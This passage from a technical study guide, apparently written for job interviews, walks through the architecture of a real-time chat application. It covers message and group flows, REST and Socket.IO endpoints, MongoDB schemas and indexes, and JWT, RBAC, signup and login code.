15. Create message:
    newMessage = new Message({
      senderId,
      receiverId,
      text,
      image: cloudinaryUrl,
      status: 'sent'
    })
16. Save to MongoDB: await newMessage.save()
    ↓
┌─────────────────┴──────────────────────────────────────────┐
│ BACKEND: Socket.IO Broadcasting                           │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
17. Get receiver's socket ID:
    receiverSocketId = await getSocketIdByUserId(receiverId)
    - Redis: get(`user:${receiverId}:socketId`)
18. If online, emit to receiver:
    io.to(receiverSocketId).emit("newMessage", newMessage)
19. Also emit to sender (for multi-device):
    senderSocketId = await getSocketIdByUserId(senderId)
    io.to(senderSocketId).emit("newMessage", newMessage)
    ↓
┌─────────────────┴──────────────────────────────────────────┐
│ FRONTEND: Real-Time Update                                │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
20. Socket.IO client receives "newMessage" event
21. useChatStore: subscribeToMessages() listener
22. setMessages([...messages, newMessage])
    - Duplicate check by _id
    - Update UI instantly
```

> **Why This Matters:** This demonstrates understanding of **dual-channel communication** - HTTP for reliability (message persistence) and WebSocket for speed (real-time updates).

---

### **4.3.4 Create Group Flow (20 Steps)**

```
1. User clicks "Create Group" button
2. CreateGroupModal opens
3. User enters: name, description, selects members
4. Form validation (name ≥ 3 chars)
5. useGroupStore.createGroup({ name, description, userIds })
   ↓
6. axios.post("/api/groups", { name, description, userIds })
7. protectRoute middleware: Verify JWT
8. Route handler: group.controllers.js → createGroup()
   ↓
9. Validate group name (≥ 3 chars)
10. Create group:
    group = await Group.create({
      name,
      description,
      createdBy: userId,
      type: 'private',
      maxMembers: 100
    })
11. Add creator as owner:
    await GroupMember.create({
      groupId: group._id,
      userId,
      role: 'owner',
      status: 'active'
    })
12. Pre-save middleware triggers:
    - Set permissions for 'owner' role
13. Add selected members:
    - Loop through userIds
    - Create GroupMember for each (role: 'member')
14. Populate creator details:
    populatedGroup = await Group.findById(group._id).populate('createdBy')
15. Response: 201 Created { group }
    ↓
16. Frontend: Add to groups array
17. Emit Socket.IO event:
    socket.emit("joinGroup", { groupId })
18. Backend: socket.join(groupId)
    - User added to Socket.IO room
19. Notify members:
    io.to(groupId).emit("groupCreated", { group })
20. Update UI: Show new group in sidebar
```

> **Interview Tip:** Group chat uses Socket.IO **rooms** feature. Each group is a room, and messages are broadcast only to users in that room.

---

### **4.3.5 Real-Time Message Receive Flow (15 Steps)**

```
┌────────────────────────────────────────────────────────────┐
│ SCENARIO: User A sends message to User B (already online) │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
1. User B is connected to Socket.IO:
   - Connection established on login
   - socket.handshake.query.userId = userB._id
   - Socket stored in Redis
   ↓
2. User A sends message (see 4.3.3 steps 1-16)
   ↓
3. Backend completes message save to MongoDB
   ↓
┌─────────────────┴──────────────────────────────────────────┐
│ BACKEND: Socket.IO Event Emission                         │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
4. getReceiverSocketId(userB._id) called
5. Redis lookup: get(`user:${userB._id}:socketId`)
   - Returns: "socketABC123"
6. io.to("socketABC123").emit("newMessage", messageData)
   ↓
┌─────────────────┴──────────────────────────────────────────┐
│ NETWORK: WebSocket Frame                                  │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
7. WebSocket frame sent over TCP connection
8. Frame received by User B's browser
   ↓
┌─────────────────┴──────────────────────────────────────────┐
│ FRONTEND: Socket.IO Client                                │
└─────────────────┬──────────────────────────────────────────┘
                  ↓
9. socket.on("newMessage", (message) => {...})
10. Check if message is for current conversation:
    if (message.senderId === selectedUser._id)
11. Update Zustand store: setMessages([...messages, message])
12. Trigger re-render: ChatContainer re-renders
13. messageEndRef.current.scrollIntoView({ behavior: "smooth" })
14. Play notification sound (if enabled)
15. Show browser notification (if tab not focused)
```

> **Key Concept:** WebSocket latency is typically **50-100ms** vs HTTP polling at **1-5 seconds**. This is why Socket.IO is essential for real-time chat.

---

## 4.4 Communication Patterns

### **4.4.1 All REST API Endpoints**

**Total Endpoints:** 35+

#### **Authentication Routes** (`/api/auth`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| POST | `/signup` | No | authLimiter (20/15min) | Create account |
| POST | `/login` | No | authLimiter (20/15min) | User login |
| POST | `/logout` | No | None | Clear JWT cookie |
| PUT | `/update-profile` | Yes | uploadLimiter (10/hour) | Update profile pic |
| GET | `/check` | Yes | None | Verify auth status |
| GET | `/methods` | No | None | Check OAuth availability |

#### **Message Routes** (`/api/messages`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| GET | `/users` | Yes | userDataLimiter (100/min) | Get all users for sidebar |
| GET | `/:id` | Yes | None | Get messages with user (paginated) |
| POST | `/send/:id` | Yes | messageLimiter (50/min) | Send DM |
| PUT | `/read/:id` | Yes | None | Mark messages as read |

#### **User Routes** (`/api/users`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| GET | `/search` | Yes | None | Search users by name/email |
| GET | `/recent` | Yes | None | Get recent conversations |
| GET | `/suggested` | Yes | None | Get suggested users |
| GET | `/profile/:userId` | Yes | None | Get user profile by ID |

#### **Chat Invite Routes** (`/api/invites`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| POST | `/send` | Yes | None | Send friend request |
| GET | `/received` | Yes | None | Get received invites |
| GET | `/sent` | Yes | None | Get sent invites |
| PUT | `/:inviteId/accept` | Yes | None | Accept friend request |
| PUT | `/:inviteId/reject` | Yes | None | Reject friend request |
| DELETE | `/:inviteId` | Yes | None | Cancel sent invite |

#### **Group Routes** (`/api/groups`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| POST | `/` | Yes | None | Create group |
| GET | `/user/groups` | Yes | None | Get user's groups |
| GET | `/:groupId` | Yes | None | Get group details |
| PUT | `/:groupId` | Yes | None | Update group info |
| DELETE | `/:groupId` | Yes | None | Delete group (owner only) |
| GET | `/:groupId/members` | Yes | None | Get group members |
| POST | `/:groupId/members` | Yes | None | Add members to group |
| DELETE | `/:groupId/members/:memberId` | Yes | None | Remove member |
| PUT | `/:groupId/members/:memberId/role` | Yes | None | Update member role |
| POST | `/:groupId/leave` | Yes | None | Leave group |

#### **Group Message Routes** (`/api/groups/:groupId/messages`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| POST | `/` | Yes | messageLimiter (50/min) | Send group message |
| GET | `/` | Yes | None | Get group messages (paginated) |
| DELETE | `/:messageId` | Yes | None | Delete group message |
| PUT | `/read` | Yes | None | Mark group messages as read |
| GET | `/unread` | Yes | None | Get unread count |

#### **OAuth Routes** (`/api/oauth`)

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| GET | `/google` | No | None | Initiate Google OAuth |
| GET | `/google/callback` | No | None | Handle OAuth callback |

#### **Analytics Routes** (`/api/analytics`) - Admin Only

| Method | Endpoint | Auth Required | Rate Limit | Purpose |
|--------|----------|---------------|------------|---------|
| GET | `/stats` | Yes (Admin) | None | Get platform statistics |
| GET | `/users` | Yes (Admin) | None | Get user analytics |
| GET | `/messages` | Yes (Admin) | None | Get message analytics |

---

### **4.4.2 Socket.IO Events**

#### **Client → Server Events**

| Event | Payload | Purpose | Handler |
|-------|---------|---------|---------|
| `connection` | `{ query: { userId } }` | User connects | Set online status, join groups |
| `disconnect` | None | User disconnects | Set offline, remove socket mapping |
| `typing` | `{ receiverId, isTyping }` | Show typing indicator (DM) | Emit to receiver |
| `groupTyping` | `{ groupId, isTyping }` | Show typing indicator (group) | Broadcast to group |
| `joinGroup` | `{ groupId }` | Join group room | Verify membership, socket.join() |
| `leaveGroup` | `{ groupId }` | Leave group room | socket.leave() |

#### **Server → Client Events**

| Event | Payload | Purpose | When Emitted |
|-------|---------|---------|--------------|
| `getOnlineUsers` | `[userId1, userId2, ...]` | Update online users list | On any connect/disconnect |
| `newMessage` | `{ _id, senderId, receiverId, text, image, createdAt }` | New DM received | After message saved to DB |
| `newGroupMessage` | `{ _id, senderId, groupId, text, image, createdAt }` | New group message | After group message saved |
| `userTyping` | `{ senderId, isTyping }` | Someone is typing (DM) | When user types |
| `userTypingInGroup` | `{ groupId, senderId, isTyping }` | Someone is typing (group) | When user types in group |
| `groupJoined` | `{ groupId }` | Confirmation of joining group | After socket.join() |
| `groupCreated` | `{ group }` | New group created | After group creation |
| `memberAdded` | `{ groupId, member }` | New member added to group | After adding member |
| `memberRemoved` | `{ groupId, userId }` | Member removed from group | After removing member |

> **Key Concept:** Socket.IO events are **bidirectional**. The client can emit to the server, and the server can emit to specific clients using socket IDs or broadcast to all.

---

### **4.4.3 Redis Pub/Sub Pattern**

**How It Works:**

```
┌──────────────────────────────────────────────────────────┐
│ MULTI-INSTANCE SCENARIO (Horizontal Scaling)            │
└──────────────────┬───────────────────────────────────────┘
                   ↓
Server Instance 1                    Server Instance 2
(User A connected)                   (User B connected)
       │                                     │
       │                                     │
       ↓                                     ↓
Socket.IO Adapter                     Socket.IO Adapter
       │                                     │
       └─────────────┬───────────────────────┘
                     ↓
              Redis Pub/Sub
         (Message Broadcasting)
```

**Flow:**
1. User A (on Instance 1) sends message to User B
2. Instance 1 saves message to MongoDB
3. Instance 1 emits Socket.IO event: `io.to(userB).emit("newMessage", msg)`
4. Socket.IO Adapter **publishes** to Redis channel
5. Redis **broadcasts** to all subscribers (Instance 1 & 2)
6. Instance 2 receives event from Redis
7. Instance 2 finds User B's socket and emits to client
8. User B receives message in real-time

> **Interview Tip:** This is how Socket.IO achieves **horizontal scalability**. Without Redis Adapter, Instance 1 can't communicate with Instance 2's connected users.

---

## 4.5 Database Architecture

### **4.5.1 Complete Schema Definitions**

#### **User Schema** (`user.model.js`)

```javascript
{
  // Authentication
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true,
    index: true  // INDEX #1
  },
  username: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    trim: true,
    minlength: 3,
    maxlength: 20,
    index: true  // INDEX #2
  },
  password: {
    type: String,
    required: function() { return !this.authProvider || this.authProvider === 'local'; },
    minlength: 6,
    select: false  // Excluded from queries by default
  },

  // Profile
  fullName: { type: String, required: true, trim: true },
  profilePic: { type: String, default: "" },

  // OAuth
  authProvider: { type: String, enum: ['local', 'google'], default: 'local' },
  providerId: { type: String, sparse: true },

  // RBAC
  role: { type: String, enum: ['user', 'moderator', 'admin'], default: 'user' },
  isActive: { type: Boolean, default: true },
  lastSeen: { type: Date, default: Date.now },

  // Timestamps (auto)
  createdAt: Date,
  updatedAt: Date
}
```

**Indexes:**
1. `email` (unique, single-field)
2. `username` (unique, single-field)
3. `createdAt: -1` (sorting)
4. `{ fullName: 'text', email: 'text', username: 'text' }` (full-text search)

**Total Indexes:** 4

---

#### **Message Schema** (`message.model.js`)

```javascript
{
  senderId: {
    type: ObjectId,
    ref: "User",
    required: true,
    index: true  // INDEX #1
  },
  receiverId: {
    type: ObjectId,
    required: true,
    index: true,  // INDEX #2
    // Can be User (DM) or Group (group chat)
  },
  isGroupMessage: {
    type: Boolean,
    default: false,
    index: true  // INDEX #3
  },

  // Content
  text: { type: String, trim: true },
  image: { type: String },
  replyTo: { type: ObjectId, ref: 'Message', default: null },

  // Delivery
  status: { type: String, enum: ['sent', 'delivered', 'read'], default: 'sent' },
  readAt: { type: Date },

  // NLP/Recall (future feature)
  entities: [{
    type: { type: String, enum: ['person', 'place', 'organization', 'topic', 'temporal'] },
    value: String,
    category: String
  }],
  concepts: [String],
  importance: { type: Number, min: 0, max: 100, default: 50, index: true },  // INDEX #4
  sentiment: { type: String, enum: ['positive', 'negative', 'neutral'], default: 'neutral' },
  keywords: [String],
  relatedMessages: [{ type: ObjectId, ref: 'Message' }],
  processingVersion: { type: String, default: '1.0' },
  processedAt: { type: Date },

  // Timestamps
  createdAt: Date,
  updatedAt: Date
}
```

**Indexes:**
1. `senderId` (single-field)
2. `receiverId` (single-field)
3. `isGroupMessage` (single-field)
4. `importance` (single-field)
5. `{ senderId: 1, receiverId: 1, createdAt: -1 }` (compound - conversation)
6. `{ receiverId: 1, senderId: 1, createdAt: -1 }` (compound - reverse conversation)
7. `{ receiverId: 1, status: 1 }` (compound - unread messages)
8. `{ createdAt: -1 }` (sorting)
9. `{ receiverId: 1, isGroupMessage: 1, createdAt: -1 }` (compound - group messages)
10. `{ concepts: 1 }` (NLP - concept search)
11. `{ 'entities.value': 1 }` (NLP - entity search)
12. `{ importance: -1, createdAt: -1 }` (compound - important messages)
13. `{ keywords: 1 }` (NLP - keyword search)

**Total Indexes:** 13

> **Why This Matters:** These compound indexes enable **sub-10ms query times** for fetching conversations, even with millions of messages.

---

#### **Group Schema** (`group.model.js`)

```javascript
{
  name: {
    type: String,
    required: true,
    trim: true,
    minlength: 3,
    maxlength: 50
  },
  description: { type: String, trim: true, maxlength: 500 },
  groupImage: { type: String, default: "" },

  createdBy: {
    type: ObjectId,
    ref: "User",
    required: true,
    index: true  // INDEX #1
  },

  // Settings
  type: { type: String, enum: ['public', 'private'], default: 'private', index: true },  // INDEX #2
  maxMembers: { type: Number, default: 100, min: 2, max: 1000 },

  settings: {
    whoCanMessage: { type: String, enum: ['all', 'admins_only'], default: 'all' },
    whoCanAddMembers: { type: String, enum: ['all', 'admins_only', 'owner_only'], default: 'admins_only' },
    requireApproval: { type: Boolean, default: false }
  },

  isActive: { type: Boolean, default: true, index: true },  // INDEX #3

  // Statistics
  stats: {
    totalMembers: { type: Number, default: 1 },
    totalMessages: { type: Number, default: 0 }
  },

  // Timestamps
  createdAt: Date,
  updatedAt: Date
}
```

**Indexes:**
1. `createdBy` (single-field)
2. `type` (single-field)
3. `isActive` (single-field)
4. `{ createdAt: -1 }` (sorting)
5. `{ name: 'text', description: 'text' }` (full-text search)

**Total Indexes:** 5

---

#### **GroupMember Schema** (`groupMember.model.js`)

```javascript
{
  groupId: {
    type: ObjectId,
    ref: "Group",
    required: true,
    index: true  // INDEX #1
  },
  userId: {
    type: ObjectId,
    ref: "User",
    required: true,
    index: true  // INDEX #2
  },

  // Role & Permissions
  role: { type: String, enum: ['owner', 'admin', 'member'], default: 'member' },
  permissions: {
    canSendMessages: { type: Boolean, default: true },
    canAddMembers: { type: Boolean, default: false },
    canRemoveMembers: { type: Boolean, default: false },
    canEditGroup: { type: Boolean, default: false }
  },

  // Membership
  nickname: { type: String, trim: true, maxlength: 30 },
  status: { type: String, enum: ['active', 'pending', 'banned', 'left'], default: 'active' },

  // Notifications
  isMuted: { type: Boolean, default: false },
  mutedUntil: { type: Date },

  // Timestamps
  joinedAt: { type: Date, default: Date.now },
  lastReadAt: { type: Date, default: Date.now },
  createdAt: Date,
  updatedAt: Date
}
```

**Indexes:**
1. `groupId` (single-field)
2. `userId` (single-field)
3. `{ groupId: 1, userId: 1 }` (compound, unique - prevent duplicate membership)
4. `{ groupId: 1, status: 1 }` (compound - active members)
5. `{ userId: 1, status: 1 }` (compound - user's groups)
6. `{ groupId: 1, role: 1 }` (compound - find admins/owners)

**Total Indexes:** 6

> **Key Concept:** The **pre-save middleware** automatically sets permissions based on role:
> - `owner`: All permissions
> - `admin`: All permissions
> - `member`: canSendMessages only

---

#### **ChatInvite Schema** (`chatInvite.model.js`)

```javascript
{
  senderId: {
    type: ObjectId,
    ref: "User",
    required: true,
    index: true  // INDEX #1
  },
  receiverId: {
    type: ObjectId,
    ref: "User",
    required: true,
    index: true  // INDEX #2
  },
  status: {
    type: String,
    enum: ["pending", "accepted", "rejected"],
    default: "pending",
    index: true  // INDEX #3
  },

  // Timestamps
  createdAt: Date,
  updatedAt: Date
}
```

**Indexes:**
1. `senderId` (single-field)
2. `receiverId` (single-field)
3. `status` (single-field)
4. `{ senderId: 1, receiverId: 1 }` (compound - prevent duplicate invites)
5. `{ receiverId: 1, status: 1 }` (compound - fetch pending invites)

**Total Indexes:** 5

---

### **4.5.2 Entity Relationship Diagram (ASCII)**

```
┌──────────────────────┐
│       User           │
│──────────────────────│
│ _id (PK)             │
│ email (UNIQUE)       │
│ username (UNIQUE)    │
│ password             │
│ role (RBAC)          │
│ authProvider         │
│ providerId           │
└──────────────────────┘
         │ 1
         │
         │ created
         │
         ↓ N
┌──────────────────────┐         ┌──────────────────────┐
│      Group           │         │     ChatInvite       │
│──────────────────────│         │──────────────────────│
│ _id (PK)             │         │ _id (PK)             │
│ name                 │         │ senderId (FK) ───────┼──→ User
│ createdBy (FK) ──────┼──→ User │ receiverId (FK) ─────┼──→ User
│ maxMembers           │         │ status               │
│ settings             │         └──────────────────────┘
└──────────────────────┘
         │ 1
         │
         │ has
         │
         ↓ N
┌──────────────────────┐
│   GroupMember        │
│──────────────────────│
│ _id (PK)             │
│ groupId (FK) ────────┼──→ Group
│ userId (FK) ─────────┼──→ User
│ role                 │
│ permissions          │
│ status               │
└──────────────────────┘


┌──────────────────────┐
│      Message         │
│──────────────────────│
│ _id (PK)             │
│ senderId (FK) ───────┼──→ User
│ receiverId (FK) ─────┼──→ User OR Group
│ isGroupMessage       │
│ text                 │
│ image                │
│ replyTo (FK) ────────┼──→ Message (self-reference)
│ status               │
│ entities (NLP)       │
│ concepts (NLP)       │
└──────────────────────┘
```

**Relationships:**
1. **User → Group**: One-to-Many (creator)
2. **User → GroupMember**: One-to-Many (member of groups)
3. **Group → GroupMember**: One-to-Many (has members)
4. **User → Message**: One-to-Many (sender)
5. **User/Group → Message**: One-to-Many (receiver)
6. **User → ChatInvite**: One-to-Many (sender & receiver)
7. **Message → Message**: One-to-Many (replies)

**Total Schemas:** 5 main (User, Message, Group, GroupMember, ChatInvite) + 1 concept (future)

---

### **4.5.3 Total Index Count**

| Schema | Indexes |
|--------|---------|
| User | 4 |
| Message | 13 |
| Group | 5 |
| GroupMember | 6 |
| ChatInvite | 5 |
| **TOTAL** | **33 indexes** |

> **Interview Tip:** When asked about performance optimization, mention: "I implemented 33 strategically placed indexes to ensure sub-10ms query times for common operations like fetching conversations, searching users, and loading group members."

---

### **4.5.4 Query Patterns**

**1. Fetch Conversation (DM)**
```javascript
// Uses compound index: { senderId: 1, receiverId: 1, createdAt: -1 }
await Message.find({
  $or: [
    { senderId: userId, receiverId: otherUserId },
    { senderId: otherUserId, receiverId: userId }
  ]
}).sort({ createdAt: -1 }).limit(50);
```
**Index Used:** `{ senderId: 1, receiverId: 1, createdAt: -1 }`
**Query Time:** ~5-10ms

---

**2. Fetch Group Messages**
```javascript
// Uses compound index: { receiverId: 1, isGroupMessage: 1, createdAt: -1 }
await Message.find({
  receiverId: groupId,
  isGroupMessage: true
}).sort({ createdAt: -1 }).limit(50);
```
**Index Used:** `{ receiverId: 1, isGroupMessage: 1, createdAt: -1 }`
**Query Time:** ~5-10ms

---

**3. Search Users**
```javascript
// Uses text index: { fullName: 'text', email: 'text', username: 'text' }
await User.find({
  $text: { $search: searchQuery }
});
```
**Index Used:** `{ fullName: 'text', email: 'text', username: 'text' }`
**Query Time:** ~10-20ms

---

**4. Get User's Groups**
```javascript
// Uses compound index: { userId: 1, status: 1 }
await GroupMember.find({
  userId: userId,
  status: 'active'
}).populate('groupId');
```
**Index Used:** `{ userId: 1, status: 1 }`
**Query Time:** ~5-10ms

---

**5. Get Group Members**
```javascript
// Uses compound index: { groupId: 1, status: 1 }
await GroupMember.find({
  groupId: groupId,
  status: 'active'
}).populate('userId');
```
**Index Used:** `{ groupId: 1, status: 1 }`
**Query Time:** ~5-10ms

---

**6. Check Unread Messages**
```javascript
// Uses compound index: { receiverId: 1, status: 1 }
const count = await Message.countDocuments({
  receiverId: userId,
  status: { $in: ['sent', 'delivered'] }
});
```
**Index Used:** `{ receiverId: 1, status: 1 }`
**Query Time:** ~2-5ms

---

> **Key Concept:** **Compound indexes** are ordered. The index `{ senderId: 1, receiverId: 1, createdAt: -1 }` can be used for:
> - Queries on `senderId` alone
> - Queries on `senderId` + `receiverId`
> - Queries on `senderId` + `receiverId` + `createdAt`
>
> But NOT for `receiverId` alone or `createdAt` alone.

---

*[Chapter 4 Complete - ~2,000 lines covering project structure, component breakdown, data flows, communication patterns, and database architecture]*

---

# CHAPTER 5: CRITICAL IMPLEMENTATIONS

## 5.1 Authentication & Authorization

### **5.1.1 JWT Verification - protectRoute Middleware**

**File:** `backend/src/middleware/auth.middleware.js`

```javascript
import jwt from "jsonwebtoken";
import User from "../models/user.model.js";

export const protectRoute = async (req, res, next) => {
    try {
        // Step 1: Extract JWT token from HTTP-only cookie
        const token = req.cookies.jwt;

        // Step 2: Check if token exists
        if (!token) {
            return res.status(401).json({
                message: "Unauthorized - No Token Provided"
            });
        }

        // Step 3: Verify token signature and expiration
        const decoded = jwt.verify(token, process.env.JWT_SECRET);

        // Step 4: Additional validation (though jwt.verify would throw if invalid)
        if (!decoded) {
            return res.status(401).json({
                message: "Unauthorized - Invalid Token"
            });
        }

        // Step 5: Fetch user from database (exclude password)
        const user = await User.findById(decoded.userId).select("-password");

        // Step 6: Check if user still exists (not deleted)
        if (!user) {
            return res.status(404).json({
                message: "User not found"
            });
        }

        // Step 7: Attach user to request object for downstream middleware/controllers
        req.user = user;

        // Step 8: Pass control to next middleware
        next();

    } catch (error) {
        console.log("Error in protectRoute middleware", error.message);
        res.status(500).json({
            message: "Internal server error"
        });
    }
};
```

**How It Works:**

```
┌─────────────────────────────────────────────────────────┐
│ CLIENT REQUEST                                          │
│ POST /api/messages/send/123                             │
│ Cookie: jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...     │
└─────────────────┬───────────────────────────────────────┘
                  ↓
┌─────────────────┴───────────────────────────────────────┐
│ MIDDLEWARE: protectRoute                                │
└─────────────────┬───────────────────────────────────────┘
                  ↓
1. Extract token from req.cookies.jwt
   - Requires cookie-parser middleware
2. jwt.verify(token, JWT_SECRET)
   - Validates signature (HMAC SHA256)
   - Checks expiration (exp claim)
   - Decodes payload: { userId, iat, exp }
3. Query database: User.findById(decoded.userId)
   - Ensures user still exists
   - Excludes password field
4. Attach user to req: req.user = userDocument
   - Available to all subsequent middleware/controllers
5. Call next() to continue chain
                  ↓
┌─────────────────┴───────────────────────────────────────┐
│ CONTROLLER: sendMessage(req, res)                       │
│ - Access user: const senderId = req.user._id            │
└─────────────────────────────────────────────────────────┘
```

> **Key Concept:** **HTTP-only cookies** prevent XSS attacks because JavaScript cannot access them. The token is sent automatically with every request, providing seamless authentication.

---

### **5.1.2 JWT Generation**

**File:** `backend/src/lib/utils.js`

```javascript
import jwt from "jsonwebtoken";

export const generateToken = (userId, res) => {
    // Create JWT with userId as payload
    const token = jwt.sign(
        { userId },                     // Payload
        process.env.JWT_SECRET,         // Secret key
        { expiresIn: "7d" }             // Expiration (7 days)
    );

    // Set as HTTP-only cookie
    res.cookie("jwt", token, {
        maxAge: 7 * 24 * 60 * 60 * 1000,  // 7 days in milliseconds
        httpOnly: true,                    // Prevents XSS
        sameSite: "strict",                // Prevents CSRF
        secure: process.env.NODE_ENV !== "development"  // HTTPS only in production
    });

    return token;
};
```

**JWT Structure:**
```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload:
{
  "userId": "507f1f77bcf86cd799439011",
  "iat": 1699564800,   // Issued at (Unix timestamp)
  "exp": 1700169600    // Expires (Unix timestamp)
}

Signature:
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  JWT_SECRET
)
```

> **Interview Tip:** JWTs are **stateless** - the server doesn't store them. This enables horizontal scaling because any server instance can verify the token without shared state.

---

### **5.1.3 Role-Based Access Control (RBAC)**

**File:** `backend/src/middleware/rbac.middleware.js` (Complete 109 lines)

```javascript
/**
 * Role-Based Access Control Middleware
 */

// Check if user has required role
export const checkRole = (...allowedRoles) => {
    return (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({ message: 'Unauthorized - No user found' });
        }

        if (!allowedRoles.includes(req.user.role)) {
            return res.status(403).json({
                message: 'Forbidden - Insufficient permissions',
                requiredRole: allowedRoles,
                userRole: req.user.role
            });
        }

        next();
    };
};

// Require admin role
export const requireAdmin = checkRole('admin');

// Require moderator or admin role
export const requireModerator = checkRole('moderator', 'admin');

// Check if user is active
export const checkActive = (req, res, next) => {
    if (!req.user) {
        return res.status(401).json({ message: 'Unauthorized - No user found' });
    }

    if (!req.user.isActive) {
        return res.status(403).json({
            message: 'Account is inactive. Please contact support.'
        });
    }

    next();
};

// Check if user owns the resource or is admin
export const checkOwnershipOrAdmin = (resourceUserIdField = 'userId') => {
    return (req, res, next) => {
        const resourceUserId = req.params[resourceUserIdField] || req.body[resourceUserIdField];

        if (!req.user) {
            return res.status(401).json({ message: 'Unauthorized - No user found' });
        }

        // Allow if user is admin or owns the resource
        if (req.user.role === 'admin' || req.user._id.toString() === resourceUserId) {
            return next();
        }

        return res.status(403).json({
            message: 'Forbidden - You can only access your own resources'
        });
    };
};

// Permission definitions
export const PERMISSIONS = {
    // User permissions
    READ_USERS: ['user', 'moderator', 'admin'],
    UPDATE_OWN_PROFILE: ['user', 'moderator', 'admin'],
    UPDATE_ANY_PROFILE: ['admin'],
    DELETE_OWN_ACCOUNT: ['user', 'moderator', 'admin'],
    DELETE_ANY_ACCOUNT: ['admin'],

    // Message permissions
    SEND_MESSAGES: ['user', 'moderator', 'admin'],
    DELETE_OWN_MESSAGES: ['user', 'moderator', 'admin'],
    DELETE_ANY_MESSAGES: ['moderator', 'admin'],

    // Chat invite permissions
    SEND_INVITES: ['user', 'moderator', 'admin'],
    MANAGE_INVITES: ['user', 'moderator', 'admin'],

    // Admin permissions
    MANAGE_USERS: ['admin'],
    MANAGE_ROLES: ['admin'],
    VIEW_ANALYTICS: ['moderator', 'admin'],
};

// Check if user has specific permission
export const hasPermission = (permission) => {
    return (req, res, next) => {
        if (!req.user) {
            return res.status(401).json({ message: 'Unauthorized - No user found' });
        }

        const allowedRoles = PERMISSIONS[permission];

        if (!allowedRoles || !allowedRoles.includes(req.user.role)) {
            return res.status(403).json({
                message: 'Forbidden - Insufficient permissions',
                permission,
                userRole: req.user.role
            });
        }

        next();
    };
};
```

**Usage Example:**
```javascript
// In routes file
import { protectRoute } from '../middleware/auth.middleware.js';
import { requireAdmin, hasPermission } from '../middleware/rbac.middleware.js';

// Only admins can access analytics
router.get('/analytics', protectRoute, requireAdmin, getAnalytics);

// Users can delete their own messages, moderators can delete any
router.delete('/messages/:id',
    protectRoute,
    hasPermission('DELETE_OWN_MESSAGES'),
    deleteMessage
);
```

> **Key Concept:** RBAC separates **authentication** (who you are) from **authorization** (what you can do). This middleware chain enforces both.

---

### **5.1.4 Signup Implementation**

**File:** `backend/src/controllers/auth.controller.js` (signup function - lines 6-63)

```javascript
export const signup = async (req, res) => {
    const { fullName, email, password, username } = req.body;

    try {
        // Step 1: Validate all required fields
        if (!fullName || !email || !password || !username) {
            return res.status(400).json({
                message: "All fields are required"
            });
        }

        // Step 2: Validate password length
        if (password.length < 6) {
            return res.status(400).json({
                message: "Password should be at least 6 characters"
            });
        }

        // Step 3: Validate username length
        if (username.length < 3 || username.length > 20) {
            return res.status(400).json({
                message: "Username must be 3-20 characters"
            });
        }

        // Step 4: Check if email or username already exists
        const existingUser = await User.findOne({
            $or: [{ email }, { username }]
        });

        if (existingUser) {
            if (existingUser.email === email) {
                return res.status(400).json({
                    message: "Email already exists"
                });
            }
            if (existingUser.username === username) {
                return res.status(400).json({
                    message: "Username already taken"
                });
            }
        }

        // Step 5: Hash password with bcrypt
        const salt = await bcrypt.genSalt(10);
        const hashPassword = await bcrypt.hash(password, salt);

        // Step 6: Create new user document
        const newUser = new User({
            fullName,
            email,
            username,
            password: hashPassword
        });

        if (newUser) {
            // Step 7: Generate JWT token and set cookie
            generateToken(newUser._id, res);

            // Step 8: Save user to database
            await newUser.save();

            // Step 9: Return user data (exclude password)
            res.status(201).json({
                _id: newUser._id,
                fullName: newUser.fullName,
                email: newUser.email,
                username: newUser.username,
                profilePic: newUser.profilePic,
            });
        } else {
            res.status(400).json({
                message: "Invalid user data"
            });
        }
    } catch (error) {
        console.log("Error in signup controller", error.message);
        res.status(500).json({
            message: "Internal server error"
        });
    }
};
```

**Security Features:**
1. **Password Hashing:** bcrypt with 10 salt rounds (2^10 = 1024 iterations)
2. **Unique Validation:** Prevents duplicate emails/usernames
3. **HTTP-only Cookie:** JWT stored securely
4. **Password Exclusion:** Never returned in response
5. **Input Validation:** Multiple layers (client, middleware, controller)

> **Interview Tip:** bcrypt is **adaptive** - you can increase salt rounds as computers get faster. Current best practice is 10-12 rounds.

---

### **5.1.5 Login Implementation**

**File:** `backend/src/controllers/auth.controller.js` (login function - lines 65-94)

```javascript
export const login = async (req, res) => {
    const { email, password } = req.body;

    try {
        // Step 1: Find user by email (include password for comparison)
        const user = await User.findOne({ email }).select("+password");

        // Step 2: Check if user exists
        if (!user) {
            return res.status(400).json({
                message: "Invalid credentials"
            });
        }

        // Step 3: Compare password with hash
        const isPasswordCorrect = await bcrypt.compare(password, user.password);

        // Step 4: Check if password matches
        if (!isPasswordCorrect) {
            return res.status(400).json({
                message: "Invalid credentials"
            });
        }

        // Step 5: Generate JWT token
        generateToken(user._id, res);

        // Step 6: Return user data (exclude password)
        res.status(200).json({
            _id: user._id,
            fullName: user.fullName,
            email: user.email,
            username: user.username,
            profilePic: user.profilePic,
        });

    } catch (error) {
        console.log("Error in login controller", error.message);
        res.status(500).json({
            message: "Internal server error"
        });
    }
};
```

**Security Best Practices:**
1. **Generic Error Messages:** Same message for wrong email or password (prevents user enumeration)
2. **select("+password"):** Explicitly include password (normally excluded)
3. **Constant-Time Comparison:** bcrypt.compare() prevents timing attacks
4. **No Password in Response:** Never expose password hash

---

